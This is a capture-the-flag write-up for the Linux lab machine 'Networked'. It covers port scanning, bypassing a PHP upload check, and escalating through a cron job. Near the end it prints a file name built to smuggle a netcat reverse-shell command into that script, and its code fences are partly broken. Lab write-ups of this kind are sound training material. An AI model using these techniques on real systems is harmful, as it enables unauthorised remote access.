# Networked - Linux (Easy)

## Summary
Networked had a relatively challenging user foothold aspect, requiring me to abuse an Apache misconfiguration allowing for file upload bypassing. After getting the first reverse shell as `www-data`, I exploited command injection in a script and then used an `ifcg` script to fully escalate my privileges as root. 

## Enumeration

I started Enumeration by running Rustscan on the the target.

```
rustscan -a $machine_IP -- -A -sV -sC -T4 -vv

-sC - Script Scan
-sV - Version Scan
-T4 - Timing Template
-A  - Aggresive Scan Options
-vv - Verbosity level

rustscan -a $machine_IP -- -A -sV -sC -T5 -v

## Port 80 - HTTP

The HTTP Landing Page indicates a regular message but running Gobuster on the target reveals the presence of a `backup` and `uploads` directory

## Source Code Review

`upload.php` ensures that appropriate steps are being followed to ensure that an uploaded file is saved properly. There is a required condition that the `check_file_type($_FILES["myFile"])` is set to True and the file size is less than 60 KiB. A MIME type typically comes from checking the MIME database for file signatures. So something that starts with `MZ` is a Windows exe (or DLL). Linux executables start with `\x7fELF`. [Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures) has a great page detailing this. So, as long as I send a small file that looks like an image to start, it will be saved as `machine_IP.$ext`, where `$ext` is anything after the first `.` in the original file name.

`upload.php` has a file upload functionality. Once a legitimate file is uploaded, `photos.php` shows the uploaded file and this can be potentially exploited to get a reverse shell.

```

I can explore this further to get a bash reverse shell which is base64 encoded as it doesn't accept spaces and pick this up further.

## Privilege Escalation

I initially get a basic shell as the `www-data` user. `crontab.guly` shows a configuration file that runs `php /home/guly/check_attack.php` every 3 minutes where `check_attack.php` is a script that processes files in `upload`

![crontab2](Images/crontab2.png)

However, I am able to skip modifying the source code to get a reverse connection by creating a new file that follows the `;` separator

```
touch '; nc $machine_IP 4444 -c bash'
```

Once this was inserted, I only had to wait for a couple of minutes before picking up the netcat reverse shell

I was able to grab the `user.txt` flag and run `sudo -l` to identify what the current user can run as root and exploit this to escalate privileges.
